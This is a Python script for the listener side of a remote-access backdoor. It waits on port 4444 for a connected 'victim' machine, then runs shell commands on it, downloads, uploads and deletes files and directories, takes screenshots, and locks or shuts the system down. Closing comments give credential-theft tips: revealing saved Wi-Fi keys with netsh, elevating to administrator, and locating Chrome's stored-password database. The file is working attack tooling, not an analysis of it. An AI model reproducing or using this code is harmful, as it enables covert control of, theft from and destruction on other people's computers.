import socket
import sys
from pyfiglet import figlet_format

def master():
    def cmdcommands():
        command = str(input("Enter Command to execute from above given options:- "))
        command = command.encode()
        c.send(command)
        print('Processing Command...')
        output = c.recv(5000)
        #output = str(c.recv(5000),"utf-8")
        output = output.decode()
        print(output)
        #if command == "exit":
         #   master()
        #else:
         #   cmdcommands()

    def customcommand():
        # command1 = str(input("Enter Command to execute from above given options:- "))
        if command1 =="getfile":
            c.send(command1.encode())
            print("")
            ssname = str(input("Enter the path of the file:- "))
            c.send(ssname.encode())
            file = c.recv(1000000)
            filename = str(input("Enter a New filename for the incoming with extension :- "))
            print("")
            print("Downloading File from the Victim's machine....")
            get_file = open(filename, "wb")
            get_file.write(file)
            get_file.close()
            print("")
            print(f'{filename} Has been Downloaded and saved in Your System....')
            print("")
        elif command1 == "delfile":
            c.send(command1.encode())
            print("")
            rmvfile = str(input("Enter name of the file:- "))
            c.send(rmvfile.encode())
            print("")
            print("Removing File from the Victim's machine....")
            print("")
            print("File has been successfully deleted from the victim's machine....")
        elif command1 == "deldir":
            c.send(command1.encode())
            print("")
            rmvdir = str(input("Enter name of the Directory:- "))
            c.send(rmvdir.encode())
            print("")
            print("Removing Directory from the Victim's machine....")
            print("")
            print(f'{rmvdir}File has been successfully deleted from the victims machine....')
        elif command1 == "sendfile":
            c.send(command1.encode())
            filename = str(input("Please enter the Filename Along with path:- "))
            sfilename = str(input("Enter New filename to be sent:- "))
            data = open(filename, "rb")
            filedata = data.read(10000)
            print("")
            print("Sending File to the Victim's machine....")
            c.send(sfilename.encode())
            print("")
            print(f'{filename} File has been successfully sent to the victims machine....')
            c.send(filedata)
        elif command1 == "lock":
            c.send(command1.encode())
            print("system locked successfully")
        elif command1 == "shutdown":
            c.send(command1.encode())
            print("Successfully sent, waiting for response")
            print("")
            c.recv(1024)
            print("Shutdown command fired")
            print("")
        elif command1 == "SS":
            c.send(command1.encode())
            print("")
            ssname = str(input("Enter name of the image:- "))
            c.send(ssname.encode())
            print("")
            print("Waiting For getting Screenshot of the Victim's Machine....")
            screenshot = c.recv(1000000)
            img = open(ssname, "wb")
            img.write(screenshot)
            img.close()
            print("ScreenShot saved successfully...")
        else:
            sys.exit(0)
    banner = figlet_format(". x . BaCk DoOr . x .")
    print(banner)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # host = socket.gethostname()
    host = ""
    port = 4444
    #sock.bind(('10.10.65.120', port))
    #sock.bind(('210.89.39.141',port))
    sock.bind((host, port))
    #sock.bind(('192.168.1.4', port))
    print("Listening for Connection on port:- " + str(port))
    print("-"*100)
    sock.listen(5)
    c, target = sock.accept()
    clientinfo = c.recv(1024).decode()
    print(clientinfo)
    print("-" * 100)
    print(f'{target} Has Connected To the Server... ')
    print("-" * 100)
    while True:
        print("----Choose from the below given options-----")
        print("1.CMD Commands\n2.Custom Commands")
        command = str(input("Enter Type of Command to execute from above given options:- "))
        c.send(command.encode())
        # print("[+] Current Working Directory(CWD)\n[+] Change Directory(CD)\n[+] Shutdown\n[+] System Information(sysinfo)\n[+] Get File(getfile)\n[+] Send File(sendfile)\n7.Delete File(delfile)\n8.Delete Director(deldir)\n9.EXIT")
        # command = str(input("Enter Command to execute from above given options:- "))
        if command == "1":
            cmdcommands()
        elif command == "2":
            print(" ")
            print("[+] Get File(getfile)\n[+] Send File(sendfile)\n[+] Delete File(delfile)\n[+] Delete Director(deldir)\n[+] ScreenShot(SS)\n[+] Shutdown\n[+] Lock\n[+] EXIT")
            command1 = str(input("Enter Command to execute from above given options:- "))
            customcommand()
        elif command == "Exit":
            print("Exiting Program....")
            sys.exit(0)
        sock.close()


if __name__ == "__main__":
    master()

# powershell netsh trace start persistent=yes capture=yes tracefile=c:\NetTrace1.etl
# netsh trace stop
# powershell -Command "Start-Process cmd -Verb RunAs" run cmd as administrator
# netsh wlan show profiles
# netsh wlan show profile name="profile name" key=clear
# C:\Users\Lenovo\AppData\Local\Google\Chrome\User Data\Default\Login Data          retrieve passwords using chromepass software